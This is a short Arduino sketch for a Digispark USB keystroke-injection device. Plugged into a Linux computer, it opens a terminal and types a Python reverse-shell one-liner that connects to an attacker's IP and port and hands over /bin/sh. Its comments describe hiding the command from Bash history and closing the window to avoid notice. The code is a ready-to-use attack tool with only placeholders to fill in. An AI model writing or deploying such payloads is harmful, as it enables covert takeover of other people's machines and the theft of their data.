// change IP and PORT

#include "DigiKeyboard.h"

void setup() {
  // Empty setup
}

void loop() {
  // Wait 1 second to ensure the OS recognizes the device
  DigiKeyboard.delay(1000);
  
  // Make sure the computer is ready
  DigiKeyboard.sendKeyStroke(0);

  // Open the terminal (using GUI + T for Linux/Ubuntu)
  // If your distro uses a different shortcut, change this.
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // The leading space prevents the command from being saved in Bash history
  // The "& exit" closes the window immediately after starting the shell
  DigiKeyboard.print(" python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' & exit");
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Stop the loop so it only runs once
  for (;;);
}
